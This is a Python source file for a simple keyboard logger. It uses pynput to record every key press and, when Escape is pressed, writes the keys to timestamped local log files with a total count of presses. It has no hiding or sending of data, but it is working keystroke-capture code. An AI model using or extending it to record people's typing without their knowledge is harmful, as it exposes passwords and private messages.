# Importing Libraries and Utilities
from pynput.keyboard import Key, Listener
from Utility import checkLogDir, checkFileSize, logFormatterString, currentLocalTime
import re
from time import time


# Class for Keyboard Logger
class keyBoardLogger:

    # Class Variables
    __count, __keys = 0, []
    _startTime, _endTime = 0.0, 0.0

    # Default Constructor
    def __init__(self):
        pass

    # Method `onPress`
    """
        Record the Key Pressings
    """
    @classmethod
    def __onPress(cls, key):

        # Appending Keys and Changing the Count
        cls.__keys.append(key)
        cls.__count += 1

    # Method `onRelease`
    """
        Close the Session when Pressed Escape.
    """
    @staticmethod
    def __onRelease(key):
        if key == Key.esc:
            keyBoardLogger.__writeFile()
            return False

    # Method `writeFile`
    """
        Recording Actions in Log Files
    """
    @classmethod
    def __writeFile(cls):

        ## Checking if Log Directory Exists or Not
        checkLogDir()

        ## Naming the Log File and doing Appropriate Checks
        timeForFile = str(currentLocalTime).replace(":", "_")
        filePath = f"Logs\\KeyBoardLog {str(timeForFile)}.txt"
        with open(filePath, "w") as file:
            fileSize = checkFileSize(filePath)
            if fileSize >= (10 ** 5):    # 100 KB
                cls.__writeFile()
            else:
                file.write(logFormatterString.format(timeLog = currentLocalTime, logerType = "KeyBoard"))
                file.write("\n")
                for key in cls.__keys:
                    cls._endTime = time()
                    if cls._endTime - cls._startTime > 60:
                        file.write(logFormatterString.format(timeLog = currentLocalTime, logerType = "KeyBoard"))
                        file.write("\n")
                        cls._startTime = time()
                    k = str(key).replace("'", "")
                    if k.find("Key") == 0:
                        keyBinding = f"[{k.split('Key.')[-1].upper()}]"
                        if keyBinding == "[ENTER]":
                            file.write(keyBinding + "\n")
                        else:
                            file.write(keyBinding)
                    elif len(re.findall("\\d{2}", k)) > 0:
                        file.write("[HOT-KEY]")
                    else:
                        file.write(k)
                finalText = f"\n\nTotal Key Presses: {cls.__count}"
                file.write(finalText)

    # Method `runKeyBoardLogger`
    """
        Main Driver Code for Listener and Release
    """
    @classmethod
    def runKeyBoardLogger(cls):

        # Collecting Events until Released
        cls._startTime = time()
        with Listener(on_press = cls.__onPress, on_release = cls.__onRelease) as listener:
            listener.join()



